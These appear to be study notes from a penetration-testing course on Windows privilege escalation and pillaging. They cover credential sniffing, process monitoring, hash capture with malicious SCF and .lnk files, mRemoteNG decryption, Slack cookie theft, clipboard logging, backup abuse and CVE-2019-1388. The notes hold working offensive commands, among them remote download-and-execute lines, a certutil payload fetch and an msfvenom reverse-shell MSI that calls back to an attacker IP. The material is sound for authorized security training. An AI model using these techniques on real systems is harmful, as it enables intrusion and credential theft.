## 1- Interacting with Users
Users are sometimes the weakest link in an organization. An overloaded employee working quickly may not notice something is "off" on their machine when browsing a shared drive, clicking on a link, or running a file. As discussed throughout this module, Windows presents us with an enormous attack surface, and there are many things to check for when enumerating local privilege escalation vectors. Once we have exhausted all options, we can look at specific techniques to steal credentials from an unsuspecting user by sniffing their network traffic/local commands or attacking a known vulnerable service requiring user interaction. One of my favorite techniques is placing malicious files around heavily accessed file shares in an attempt to retrieve user password hashes to crack offline later.
#### Traffic Capture
If `Wireshark` is installed, unprivileged users may be able to capture network traffic, as the option to restrict Npcap driver access to Administrators only is not enabled by default.
![[Pasted image 20260120163554.png]]
Here we can see a rough example of capturing cleartext FTP credentials entered by another user while signed into the same box. While not highly likely, if `Wireshark` is installed on a box that we land on, it is worth attempting a traffic capture to see what we can pick up.
![[Pasted image 20260120163704.png]]

Also, suppose our client positions us on an attack machine within the environment. In that case, it is worth running `tcpdump` or `Wireshark` for a while to see what types of traffic are being passed over the wire and if we can see anything interesting. The tool [net-creds](https://github.com/DanMcInerney/net-creds) can be run from our attack box to sniff passwords and hashes from a live interface or a pcap file. It is worth letting this tool run in the background during an assessment or running it against a pcap to see if we can extract any credentials useful for privilege escalation or lateral movement.
```bash
## Wireshark
  ip.addr == 56.48.210.13 # Filters packets with a specific IP address
  tcp.port == 80 # Filters packets by port (HTTP in this case).
  http # Filters for HTTP traffic.
  dns # Filters DNS traffic, which is useful to monitor domain name resolution.
  tcp.flags.syn == 1 && tcp.flags.ack == 0 # Filters SYN packets (used in TCP handshakes), useful for detecting scanning or connection attempts.
  icmp # Filters ICMP packets (used for Ping), which can be useful for reconnaissance or network issues.
  http.request.method == "POST" # Filters for HTTP POST requests. In the case that POST requests are sent over unencrypted HTTP, it may be the case that passwords or other sensitive information is contained within.
  tcp.stream eq 53 # Filters for a specific TCP stream. Helps track a conversation between two hosts.
  eth.addr == 00:11:22:33:44:55 # Filters packets from/to a specific MAC address.
  ip.src == 192.168.24.3 && ip.dst == 56.48.210.3 # Filters traffic between two specific IP addresses. Helps track communication between specific hosts.


## tcpdump (must have root priv on machine)
tcpdump -i ens192 -s 65535 -w ilfreight_pcap  # -s = max packet length
wireshark ilfreight_pcap  # Later analysis
```
#### Process Command Lines
###### Monitoring for Process Command Lines
When getting a shell as a user, there may be scheduled tasks or other processes being executed which pass credentials on the command line. We can look for process command lines using something like this script below. It captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.
```powershell
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```
###### Running Monitor Script on Target Host
We can host the script on our attack machine and execute it on the target host as follows.
```powershell
IEX (iwr 'http://10.10.10.205/procmon.ps1') 
  # @{CommandLine=net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd}       =>       
```
This is successful and reveals the password for the `sqlsvc` domain user, which we could then possibly use to gain access to the SQL02 host or potentially find sensitive data such as database credentials on the `backups` share.
#### Vulnerable Services
We may also encounter situations where we land on a host running a vulnerable application that can be used to elevate privileges through user interaction. [CVE-2019–15752](https://medium.com/@morgan.henry.roman/elevation-of-privilege-in-docker-for-windows-2fd8450b478e) is a great example of this. This was a vulnerability in Docker Desktop Community Edition before 2.1.0.1. When this particular version of Docker starts, it looks for several different files, including `docker-credential-wincred.exe`, `docker-credential-wincred.bat`, etc., which do not exist with a Docker installation. The program looks for these files in the `C:\PROGRAMDATA\DockerDesktop\version-bin\`. This directory was misconfigured to allow full write access to the `BUILTIN\Users` group, meaning that any authenticated user on the system could write a file into it (such as a malicious executable).

Any executable placed in that directory would run when a) the Docker application starts and b) when a user authenticates using the command `docker login`. While a bit older, it is not outside the realm of possibility to encounter a developer's workstation running this version of Docker Desktop, hence why it is always important to thoroughly enumerate installed software. While this particular flaw wouldn't guarantee us elevated access (since it relies on a service restart or user action), we could plant our executable during a long-term assessment and periodically check if it runs and our privileges are elevated.
#### SCF on a File Share
A Shell Command File (SCF) is used by Windows Explorer to move up and down directories, show the Desktop, etc. An SCF file can be manipulated to have the icon file location point to a specific UNC path and have Windows Explorer start an SMB session when the folder where the .scf file resides is accessed. If we change the IconFile to an SMB server that we control and run a tool such as [Responder](https://github.com/lgandx/Responder), [Inveigh](https://github.com/Kevin-Robertson/Inveigh), or [InveighZero](https://github.com/Kevin-Robertson/InveighZero), we can often capture NTLMv2 password hashes for any users who browse the share. This can be particularly useful if we gain write access to a file share that looks to be heavily used or even a directory on a user's workstation. We may be able to capture a user's password hash and use the cleartext password to escalate privileges on the target host, within the domain, or further our access/gain access to other resources.
###### Malicious SCF File
In this example, let's create the following file and name it something like `@Inventory.scf` (similar to another file in the directory, so it does not appear out of place). We put an `@` at the start of the file name to appear at the top of the directory to ensure it is seen and executed by Windows Explorer as soon as the user accesses the share. Here we put in our `tun0` IP address and any fake share name and .ico file name.
```cmd
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```
###### Starting Responder
Next, start Responder on our attack box and wait for the user to browse the share. If all goes to plan, we will see the user's NTLMV2 password hash in our console and attempt to crack it offline.
```shell-session
sudo responder -wrf -v -I tun0
  # [SMB] NTLMv2-SSP Hash     : Administrator::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...<SNIP>...
```
###### Cracking NTLMv2 Hash with Hashcat
We could then attempt to crack this password hash offline using `Hashcat` to retrieve the cleartext.
```shell-session
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```
> in our example, wait  for the "user" to browse the share after starting Responder.

#### Capturing Hashes with a Malicious .lnk File
Using SCFs no longer works on Server 2019 hosts, but we can achieve the same effect using a malicious [.lnk](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943) file. We can use various tools to generate a malicious .lnk file, such as [Lnkbomb](https://github.com/dievus/lnkbomb), as it is not as straightforward as creating a malicious .scf file. We can also make one using a few lines of PowerShell:
###### Generating a Malicious .lnk File
```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save(
```
Try out this technique on the target host to familiarize yourself with the methodology and add another tactic to your arsenal for when you encounter environments where Server 2019 is prevalent.


---
## 2- Pillaging
Pillaging is the process of obtaining information from a compromised system. It can be personal information, corporate blueprints, credit card data, server information, infrastructure and network details, passwords, or other types of credentials, and anything relevant to the company or security assessment we are working on.

These data points may help gain further access to the network or complete goals defined during the pre-engagement process of the penetration test. This data can be stored in various applications, services, and device types, which may require specific tools for us to extract.
#### Data Sources
Below are some of the sources from which we can obtain information from compromised systems:

- Installed applications
- Installed services
    - Websites
    - File Shares
    - Databases
    - Directory Services (such as Active Directory, Azure AD, etc.)
    - Name Servers
    - Deployment Services
    - Certificate Authority
    - Source Code Management Server
    - Virtualization
    - Messaging
    - Monitoring and Logging Systems
    - Backups
- Sensitive Data
    - Keylogging
    - Screen Capture
    - Network Traffic Capture
    - Previous Audit reports
- User Information
    - History files, interesting documents (.doc/x,.xls/x,password._/pass._, etc)
    - Roles and Privileges
    - Web Browsers
    - IM Clients

This is not a complete list. Anything that can provide information about our target will be valuable. Depending on the business size, purpose, and scope, we may find different information. Knowledge and familiarity with commonly used applications, server software, and middleware are essential, as most applications store their data in various formats and locations. Special tools may be necessary to obtain, extract or read the targeted data from some systems.

During the following sections, we will discuss and practice some aspects of Pillaging in Windows.
#### Scenario
Let's assume that we have gained a foothold on the Windows server mentioned in the below network and start collecting as much information as possible.
![[Pasted image 20260121031019.png]]
#### Installed Applications
Understanding which applications are installed on our compromised system may help us achieve our goal during a pentest. It's important to know that every pentest is different. We may encounter a lot of unknown applications on the systems we compromised. Learning and understanding how these applications connect to the business are essential to achieving our goal.

We will also find typical applications such as Office, remote management systems, IM clients, etc. We can use `dir` or `ls` to check the content of `Program Files` and `Program Files (x86)` to find which applications are installed. Although there may be other apps on the computer, this is a quick way to review them.
###### Identifying Common Applications
```cmd
dir "C:\Program Files"
```
An alternative is to use PowerShell and read the Windows registry to collect more granular information about installed programs.
###### Get Installed Programs via PowerShell & Registry Keys
```powershell
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```
We can see the `mRemoteNG` software is installed on the system. [mRemoteNG](https://mremoteng.org) is a tool used to manage and connect to remote systems using VNC, RDP, SSH, and similar protocols. Let's take a look at `mRemoteNG`.
##### mRemoteNG
`mRemoteNG` saves connection info and credentials to a file called `confCons.xml`. They use a hardcoded master password, `mR3m`, so if anyone starts saving credentials in `mRemoteNG` and does not protect the configuration with a password, we can access the credentials from the configuration file and decrypt them.

By default, the configuration file is located in `%USERPROFILE%\APPDATA\Roaming\mRemoteNG`.
###### Discover mRemoteNG Configuration Files
```powershell
ls C:\Users\julio\AppData\Roaming\mRemoteNG  # => confCons.xml
```
Let's look at the contents of the `confCons.xml` file.
###### mRemoteNG Configuration File - confCons.xml
```xml
<?XML version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe" ConfVersion="2.6">
    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389"
    ..SNIP..
</Connections>
```
This XML document contains a root element called `Connections` with the information about the encryption used for the credentials and the attribute `Protected`, which corresponds to the master password used to encrypt the document. We can use this string to attempt to crack the master password. We will find some elements named `Node` within the root element. Those nodes contain details about the remote system, such as username, domain, hostname, protocol, and password. All fields are plaintext except the password, which is encrypted with the master password.

As mentioned previously, if the user didn't set a custom master password, we can use the script [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) to decrypt the password. We need to copy the attribute `Password` content and use it with the option `-s`. If there's a master password and we know it, we can then use the option `-p` with the custom master password to also decrypt the password.
###### Decrypt the Password with mremoteng_decrypt
```bash
python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" 
  # Password: ASDki230kasd09fk233aDA
```
Now let's look at an encrypted configuration file with a custom password. For this example, we set the custom password `admin`.
###### mRemoteNG Configuration File - confCons.xml
```xml
<?XML version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="1ZR9DpX3eXumopcnjhTQ7e78u+SXqyxDmv2jebJg09pg55kBFW+wK1e5bvsRshxuZ7yvteMgmfMW5eUzU4NG" ConfVersion="2.6">
    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="False" 
    
<SNIP>
</Connections>
```
If we attempt to decrypt the `Password` attribute from the node `RDP_Domain`, we will get the following error.
###### Attempt to Decrypt the Password with a Custom Password
```bash
python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA=="
  # ValueError: MAC check failed
```
If we use the custom password, we can decrypt it.
###### Decrypt the Password with mremoteng_decrypt and a Custom Password
```bash
python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p admin
  # Password: ASDki230kasd09fk233aDA
```
In case we want to attempt to crack the password, we can modify the script to try multiple passwords from a file, or we can create a Bash `for loop`. We can attempt to crack the `Protected` attribute or the `Password` itself. If we try to crack the `Protected` attribute once we find the correct password, the result will be `Password: ThisIsProtected`. If we try to crack the `Password` directly, the result will be `Password: <PASSWORD>`.
###### For Loop to Crack the Master Password with mremoteng_decrypt
```bash
for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done    
   # Spring2017 
   # Spring2016 
   # admin 
   # Password: ASDki230kasd09fk233aDA
   # admin admin          
```
##### Abusing Cookies to Get Access to IM Clients (Slack app)
With the ability to instantaneously send messages between co-workers and teams, instant messaging (IM) applications like `Slack` and `Microsoft Teams` have become staples of modern office communications. These applications help in improving collaboration between co-workers and teams. If we compromise a user account and gain access to an IM Client, we can look for information in private chats and groups.

There are multiple options to gain access to an IM Client; one standard method is to use the user's credentials to get into the cloud version of the instant messaging application as the regular user would.

If the user is using any form of multi-factor authentication, or we can't get the user's plaintext credentials, we can try to steal the user's cookies to log in to the cloud-based client.

There are often tools that may help us automate the process, but as the cloud and applications constantly evolve, we may find these applications out of date, and we still need to find a way to gather information from the IM clients. Understanding how to abuse credentials, cookies, and tokens is often helpful in accessing web applications such as IM Clients.

Let's use `Slack` as an example. Multiple posts refer to how to abuse `Slack` such as [Abusing Slack for Offensive Operations](https://posts.specterops.io/abusing-slack-for-offensive-operations-2343237b9282) and [Phishing for Slack-tokens](https://thomfre.dev/post/2021/phishing-for-slack-tokens/). We can use them to understand better how Slack tokens and cookies work, but keep in mind that `Slack's` behavior may have changed since the release of those posts.

There's also a tool called [SlackExtract](https://github.com/clr2of8/SlackExtract) released in 2018, which was able to extract `Slack` messages. Their research discusses the cookie named `d`, which `Slack` uses to store the user's authentication token. If we can get our hands on that cookie, we will be able to authenticate as the user. Instead of using the tool, we will attempt to obtain the cookie from Firefox or a Chromium-based browser and authenticate as the user.

###### Cookie Extraction from Firefox

Firefox saves the cookies in an SQLite database in a file named `cookies.sqlite`. This file is in each user's APPDATA directory `%APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release`. There's a piece of the file that is random, and we can use a wildcard in PowerShell to copy the file content.
**Copy Firefox Cookies Database:**
```powershell
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```
We can copy the file to our machine and use the Python script [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) to extract cookies from the Firefox cookies.SQLite database.
**Extract Slack Cookie from Firefox Cookies Database:**
```bash
 python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
  # (201, '', 'd', 'xoxd-CJRafjAvR3UcF%2FXpCDOu6xEUVa3romzdAPiVoaqDHZW5A9oOpiHF0G749yFOSCedRQHi%2FldpLjiPQoz0OXAwS0%2FyqK5S8bw2Hz%2FlW1AbZQ%2Fz1zCBro6JA1sCdyBv7I3GSe1q5lZvDLBuUHb86C%2Bg067lGIW3e1XEm6J5Z23wmRjSmW9VERfce5KyGw%3D%3D', '.slack.com', '/', 1974391707, 1659379143849000, 1658439420528000, 1, 1, 0, 1, 1, 2)
```
Now that we have the cookie, we can use any browser extension to add the cookie to our browser. For this example, we will use Firefox and the extension [Cookie-Editor](https://cookie-editor.cgagnier.ca/). Make sure to install the extension by clicking the link, selecting your browser, and adding the extension. Once the extension is installed, you will see something like this:
![[Pasted image 20260121031923.png]]
Our target website is `slack.com`. Now that we have the cookie, we want to impersonate the user. Let's navigate to slack.com once the page loads, click on the icon for the Cookie-Editor extension, and modify the value of the `d` cookie with the value you have from the cookieextractor.py script. Make sure to click the save icon (marked in red in the image below).
![[Pasted image 20260121031944.png]]
Once you have saved the cookie, you can refresh the page and see that you are logged in as the user.
![[Pasted image 20260121031958.png]]
Now we are logged in as the user and can click on `Launch Slack`. We may get a prompt for credentials or other types of authentication information; we can repeat the above process and replace the cookie `d` with the same value we used to gain access the first time on any website that asks us for information or credentials
![[Pasted image 20260121032016.png]]
Once we complete this process for every website where we get a prompt, we need to refresh the browser, click on `Launch Slack` and use Slack in the browser.

After gaining access, we can use built-in functions to search for common words like passwords, credentials, PII, or any other information relevant to our assessment.
![[Pasted image 20260121032039.png]]
###### Cookie Extraction from Chromium-based Browsers
The chromium-based browser also stores its cookies information in an SQLite database. The only difference is that the cookie value is encrypted with [Data Protection API (DPAPI)](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection). `DPAPI` is commonly used to encrypt data using information from the current user account or computer.

To get the cookie value, we'll need to perform a decryption routine from the session of the user we compromised. Thankfully, a tool [SharpChromium](https://github.com/djhohnstein/SharpChromium) does what we need. It connects to the current user SQLite cookie database, decrypts the cookie value, and presents the result in JSON format.

Let's use [Invoke-SharpChromium](https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1), a PowerShell script created by [S3cur3Th1sSh1t](https://twitter.com/ShitSecure) which uses reflection to load SharpChromium.
**PowerShell Script - Invoke-SharpChromium:**
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh
arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
Invoke-SharpChromium -Command "cookies slack.com"
  # [X] Exception: Could not find file 'C:\Users\lab_admin\AppData\Local\Google\Chrome\User Data\\Default\Cookies'.
```
We got an error because the cookie file path that contains the database is hardcoded in [SharpChromium](https://github.com/djhohnstein/SharpChromium/blob/master/ChromiumCredentialManager.cs#L47), and the current version of Chrome uses a different location.

We can modify the code of `SharpChromium` or copy the cookie file to where SharpChromium is looking.

`SharpChromium` is looking for a file in `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies`, but the actual file is located in `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies` with the following command we will copy the file to the location SharpChromium is expecting.
**Copy Cookies to SharpChromium Expected Location:**
```powershell
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
```
We can now use Invoke-SharpChromium again to get a list of cookies in JSON format.
**Invoke-SharpChromium Cookies Extraction:**
```powershell
Import-Module .\Invoke-SharpChromium.ps1
Invoke-SharpChromium -Command "cookies slack.com"
```
We can now use this cookie with cookie-editor as we did with Firefox.

> When copy/pasting the contents of a cookie, make sure the value is one line.

##### Clipboard
In many companies, network administrators use password managers to store their credentials and copy and paste passwords into login forms. As this doesn't involve `typing` the passwords, keystroke logging is not effective in this case. The `clipboard` provides access to a significant amount of information, such as the pasting of credentials and 2FA soft tokens, as well as the possibility to interact directly with the RDP session clipboard.

We can use the [Invoke-Clipboard](https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1) script to extract user clipboard data. Start the logger by issuing the command below.
**Monitor the Clipboard with PowerShell**
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
Invoke-ClipboardLogger
```
The script will start to monitor for entries in the clipboard and present them in the PowerShell session. We need to be patient and wait until we capture sensitive information.
**Capture Credentials from the Clipboard with Invoke-ClipboardLogger**
```powershell
Invoke-ClipboardLogger
  # Administrator@something.com
  # Sup9rC0mpl2xPa$$ws0921lk
```
> User credentials can be obtained with tools such as Mimikatz or a keylogger. C2 Frameworks such as Metasploit contain built-in functions for keylogging

#### Roles and Services
Services on a particular host may serve the host itself or other hosts on the target network. It is necessary to create a profile of each targeted host, documenting the configuration of these services, their purpose, and how we can potentially use them to achieve our assessment goals. Typical server roles and services include:

- File and Print Servers
- Web and Database Servers
- Certificate Authority Servers
- Source Code Management Servers
- Backup Servers

Let's take `Backup Servers` as an example, and how, if we compromise a server or host with a backup system, we can compromise the network.

##### Attacking Backup Servers

In information technology, a `backup` or `data backup` is a copy of computer data taken and stored elsewhere so that it may be used to restore the original after a data loss event. Backups can be used to recover data after a loss due to data deletion or corruption or to recover data from an earlier time. Backups provide a simple form of disaster recovery. Some backup systems can reconstitute a computer system or other complex configurations, such as an Active Directory server or database server.

Typically backup systems need an account to connect to the target machine and perform the backup. Most companies require that backup accounts have local administrative privileges on the target machine to access all its files and services.

If we gain access to a `backup system`, we may be able to review backups, search for interesting hosts and restore the data we want.

As we previously discussed, we are looking for information that can help us move laterally in the network or escalate our privileges. Let's use [restic](https://restic.net/) as an example. `Restic` is a modern backup program that can back up files in Linux, BSD, Mac, and Windows.

To start working with `restic`, we must create a `repository` (the directory where backups will be stored). `Restic` checks if the environment variable `RESTIC_PASSWORD` is set and uses its content as the password for the repository. If this variable is not set, it will ask for the password to initialize the repository and for any other operation in this repository.

We will use `restic 0.13.1` and back up the repository `C:\xampp\htdocs\webapp` in `E:\restic\` directory. To download the latest version of restic, visit [https://github.com/restic/restic/releases/latest](https://github.com/restic/restic/releases/latest). On our target machine, restic is located at `C:\Windows\System32\restic.exe`.

We first need to create and initialize the location where our backup will be saved, called the `repository`.
###### restic - Initialize Backup Directory
```powershell
mkdir E:\restic2; restic.exe -r E:\restic2 init
```
Then we can create our first backup.
###### restic - Back up a Directory
```powershell
$env:RESTIC_PASSWORD = 'Password'
restic.exe -r E:\restic2\ backup C:\SampleFolder
```
If we want to back up a directory such as `C:\Windows`, which has some files actively used by the operating system, we can use the option `--use-fs-snapshot` to create a VSS (Volume Shadow Copy) to perform the backup.
###### restic - Back up a Directory with VSS
```powershell
restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot
```
>If the user doesn't have the rights to access or copy the content of a directory, we may get an Access denied message. The backup will be created, but no content will be found.

We can also check which backups are saved in the repository using the `snapshot` command.
###### restic - Check Backups Saved in a Repository
```powershell
restic.exe -r E:\restic2\ snapshots
```
We can restore a backup using the ID.
###### restic - Restore a Backup with ID
```powershell
restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore
```
If we navigate to `C:\Restore`, we will find the directory structure where the backup was taken. To get to the `SampleFolder` directory, we need to navigate to `C:\Restore\C\SampleFolder`.

We need to understand our targets and what kind of information we are looking for. If we find a backup for a Linux machine, we may want to check files like `/etc/shadow` to crack users' credentials, web configuration files, `.ssh` directories to look for SSH keys, etc.

If we are targeting a Windows backup, we may want to look for the SAM & SYSTEM hive to extract local account hashes. We can also identify web application directories and common files where credentials or sensitive information is stored, such as web.config files. Our goal is to look for any interesting files that can help us achieve our goal.

> restic works similarly in Linux. If we don't know where restic snapshots are saved, we can look in the file system for a directory named snapshots. Keep in mind that the environment variable may not be set. If that's the case, we will need to provide a password to restore the files.

Hundreds of applications and methods exist to perform backups, and we cannot detail each. This `restic` case is an example of how a backup application could work. Other systems will manage a centralized console and special repositories to save the backup information and execute the backup tasks.

As we move forward, we will find different backup systems, and we recommend taking the time to understand how they work so that we can eventually abuse their functions for our purpose.
#### Conclusion
There are still plenty of locations, applications, and methods to obtain interesting information from a targeted host or a compromised network. We may find information in cloud services, network devices, IoT, etc. Be open and creative to explore your target and network and obtain the information you need using your methods and experience.


---

## 3-Miscellaneous Techniques

#### Living Off The Land Binaries and Scripts (LOLBAS)
The [LOLBAS project](https://lolbas-project.github.io/) documents binaries, scripts, and libraries that can be used for "living off the land" techniques on Windows systems. Each of these binaries, scripts and libraries is a Microsoft-signed file that is either native to the operating system or can be downloaded directly from Microsoft and have unexpected functionality useful to an attacker. Some interesting functionality may include:

||||
|---|---|---|
|Code execution|Code compilation|File transfers|
|Persistence|UAC bypass|Credential theft|
|Dumping process memory|Keylogging|Evasion|
|DLL hijacking|||

**Transferring File with Certutil**
One classic example is [certutil.exe](https://lolbas-project.github.io/lolbas/Binaries/Certutil/), whose intended use is for handling certificates but can also be used to transfer files by either downloading a file to disk or base64 encoding/decoding a file.
```powershell
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
```
**Encoding File with Certutil**
We can use the `-encode` flag to encode a file using base64 on our Windows attack host and copy the contents to a new file on the remote system.
```cmd-session
certutil -encode file1 encodedfile
```
**Decoding File with Certutil**
Once the new file has been created, we can use the `-decode` flag to decode the file back to its original contents.
```cmd
certutil -decode encodedfile file2
```
A binary such as [rundll32.exe](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/) can be used to execute a DLL file. We could use this to obtain a reverse shell by executing a .DLL file that we either download onto the remote host or host ourselves on an SMB share.

It is worth reviewing this project and becoming familiar with as many binaries, scripts, and libraries as possible. They could prove to be very useful during an evasive assessment, or one in which the client restricts us to only a managed Windows workstation/server instance to test from.

#### Always Install Elevated
This setting can be set via Local Group Policy by setting `Always install with elevated privileges` to `Enabled` under the following paths.

- `Computer Configuration\Administrative Templates\Windows Components\Windows Installer`
- `User Configuration\Administrative Templates\Windows Components\Windows Installer`
- ![[Pasted image 20260121051614.png]]
###### Enumerating Always Install Elevated Settings
Let's enumerate this setting.
```powershell
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
  #     AlwaysInstallElevated    REG_DWORD    0x1
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
  #   AlwaysInstallElevated    REG_DWORD    0x1  
```
Our enumeration shows us that the `AlwaysInstallElevated` key exists, so the policy is indeed enabled on the target system.
###### Generating MSI Package
We can exploit this by generating a malicious `MSI` package and execute it via the command line to obtain a reverse shell with SYSTEM privileges.
```bash
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
```
###### Executing MSI Package
We can upload this MSI file to our target, start a Netcat listener and execute the file from the command line like so:
```cmd
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```
###### Catching Shell
If all goes to plan, we will receive a connection back as `NT AUTHORITY\SYSTEM`.
```bash
 nc -lnvp 9443
   # C:\Windows\system32>whoami
```
This issue can be mitigated by disabling the two Local Group Policy settings mentioned above.
#### CVE-2019-1388
[CVE-2019-1388](https://nvd.nist.gov/vuln/detail/CVE-2019-1388) was a privilege escalation vulnerability in the Windows Certificate Dialog, which did not properly enforce user privileges. The issue was in the UAC mechanism, which presented an option to show information about an executable's certificate, opening the Windows certificate dialog when a user clicks the link. The `Issued By` field in the General tab is rendered as a hyperlink if the binary is signed with a certificate that has Object Identifier (OID) `1.3.6.1.4.1.311.2.1.10`. This OID value is identified in the [wintrust.h](https://docs.microsoft.com/en-us/windows/win32/api/wintrust/) header as [SPC_SP_AGENCY_INFO_OBJID](https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptformatobject) which is the `SpcSpAgencyInfo` field in the details tab of the certificate dialog. If it is present, a hyperlink included in the field will render in the General tab. This vulnerability can be exploited easily using an old Microsoft-signed executable ([hhupd.exe](https://packetstormsecurity.com/files/14437/hhupd.exe.html)) that contains a certificate with the `SpcSpAgencyInfo` field populated with a hyperlink.

When we click on the hyperlink, a browser window will launch running as `NT AUTHORITY\SYSTEM`. Once the browser is opened, it is possible to "break out" of it by leveraging the `View page source` menu option to launch a `cmd.exe` or `PowerShell.exe` console as SYSTEM.

Let's run through the vulnerability in practice.

First right click on the `hhupd.exe` executable and select `Run as administrator` from the menu.
![[Pasted image 20260121051906.png]]
Next, click on `Show information about the publisher's certificate` to open the certificate dialog. Here we can see that the `SpcSpAgencyInfo` field is populated in the Details tab.
![[Pasted image 20260121051937.png]]
Next, we go back to the General tab and see that the `Issued by` field is populated with a hyperlink. Click on it and then click `OK`, and the certificate dialog will close, and a browser window will launch.
![[Pasted image 20260121051954.png]]
If we open `Task Manager`, we will see that the browser instance was launched as SYSTEM.
![[Pasted image 20260121052019.png]]
Next, we can right-click anywhere on the web page and choose `View page source`. Once the page source opens in another tab, right-click again and select `Save as`, and a `Save As` dialog box will open.
![[Pasted image 20260121052036.png]]
At this point, we can launch any program we would like as SYSTEM. Type `c:\windows\system32\cmd.exe` in the file path and hit enter. If all goes to plan, we will have a cmd.exe instance running as SYSTEM.
![[Pasted image 20260121052053.png]]
Microsoft released a [patch](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2019-1388) for this issue in November of 2019. Still, as many organizations fall behind on patching, we should always check for this vulnerability if we gain GUI access to a potentially vulnerable system as a low-privilege user.

